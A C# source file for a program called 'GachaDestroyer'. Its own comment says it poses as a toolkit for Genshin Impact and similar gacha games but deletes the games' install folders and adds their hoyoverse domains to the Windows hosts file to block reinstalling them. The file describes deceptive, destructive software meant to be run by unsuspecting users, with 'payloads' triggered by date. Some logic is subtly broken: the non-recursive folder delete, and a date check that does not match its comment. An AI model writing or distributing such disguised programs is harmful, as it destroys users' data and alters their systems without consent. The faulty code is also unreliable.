//This program claims to be a set of tools for Genshin Impact/other gacha games but instead deletes the game(s) in question and blocks domains related to them to prevent the games from being reinstalled or played again
//For legal reasons, 'Payload' in the code comments does not mean anything malicious. 
/*
 * TODO:
 * Get domains and delete Honkai 3 as well
 * Have a way of searching all drives for the installation folders for the games
 */

namespace GachaDestroyer
{
    internal class Program
    {
        static void Main(String[] args)
        {
            //Hosts file path, should not need to change this
            string hosts = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
            string localhost = "127.0.0.1";
            string contents = File.ReadAllText(hosts);

            //Don't modify these unless you want the program to always do these things
            bool actuallyDeleteFiles = false;
            bool blockDomains = false;

            //Default Directory Paths, change these as necessary
            string GenshinDir = @"C:\Program Files\Epic Games\GenshinImpact";
            string StarRailDir = @"C:\Program Files\Epic Games\HonkaiStarRail";

            //The strings of the domains to block. 
            string[] domainsToBlock = { "genshin.hoyoverse.com", "hk4e-launcher.hoyoverse.com", "sg-public-api-static.hoyoverse.com", "launcher-webstatic.hoyoverse.com", "sdk.hoyoverse.com", "sentry.eks.hoyoverse.com", "fastcdn.hoyoverse.com", "minor-api-os.hoyoverse.com", "starrail.hoyoverse.com", "abtest-api-data-sg.hoyoverse.com", "hkrpg-launcher-static.hoyoverse.com", "api-global-takumi-static.mihoyo.com", "sdk-os-static.hoyoverse.com" };

            //Check if the --DELETE/--BLOCK argument is given before deleting the files/blocking domains; Idiot Proofing
            for (int i = 0; i < args.Length; i++)
            {
                //Console.WriteLine(args[i]);
                if (args[i] == "--DELETE")
                {
                    actuallyDeleteFiles = true;
                    Console.WriteLine("Deleting Files");
                }

                if (args[i] == "--BLOCK")
                {
                    blockDomains = true;
                    Console.WriteLine("Blocking Domains");
                }
            }

            //Misc stuff, change cmd to green to make it look more like the matrix and get the date/time
            string dateTime = (DateTime.Now).ToString();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(dateTime);

            //Do the things
            Collide();
            Derail();

            //Block the domains if the --BLOCK arg is given, not if the games are installed
            if (blockDomains) { blockDomainsToHostsFile(domainsToBlock); }

            /////////////
            //Functions//
            /////////////

            //Collide, the function that deletes Genshin. Add additional payloads if the date is Sept. 28, the game's anniversary.
            void Collide()
            {
                if (Directory.Exists(GenshinDir))
                {
                    Console.WriteLine("Genshin Impact Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(GenshinDir); }

                    //Trigger payloads if date is September 28, the release date
                    if (dateTime.Contains("8/28/"))
                    {
                        Console.WriteLine("Unhappy Birthday Genshin!");
                    }
                    //File.Delete(@"C:\Program Files\Epic Games\GenshinImpact\Genshin Impact Game\GenshinImpact.exe");
                }
                else
                {
                    Console.WriteLine("Genshin not detected");
                }
            }

            //Derail, for making Star Rail star fail. 
            void Derail()
            {
                if (Directory.Exists(StarRailDir))
                {
                    Console.WriteLine("Star Rail Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(StarRailDir); }

                    //Trigger payloads if date is April 25, the release date, or March 7th, which is apparently the mascot for the game. Yes these idiots went and actually named a character after a random day of the gregorian calendar.
                    if (dateTime.Contains("4/25/") | dateTime.Contains("3/07/"))
                    {
                        Console.WriteLine("");
                    }
                }
                else
                {
                    Console.WriteLine("Honkai Star Rail not detected");
                }
            }

            //Function to block domains to the hosts file
            void blockDomainsToHostsFile(string[] domains)
            {
                for (int i = 0; i < domains.Length; i++)
                {
                    //Map localhost to each domain in the hosts file
                    try
                    {
                        using (StreamWriter sw = File.AppendText(hosts))
                        {
                            if (checkHosts(domains[i]) == false)
                            {
                                Console.WriteLine(domains[i]);
                                sw.WriteLine($"{localhost} {domains[i]}");
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Don't have Admin, cannot block hosts");
                        break;
                    }
                }
            }

            //Check if a domain is in the hosts file
            bool checkHosts(string domain)
            {
                if (contents.Contains(domain)) { return true; } else { return false; }
            }

            //Stop the program from exiting
            Console.ReadLine();
        }
    }
}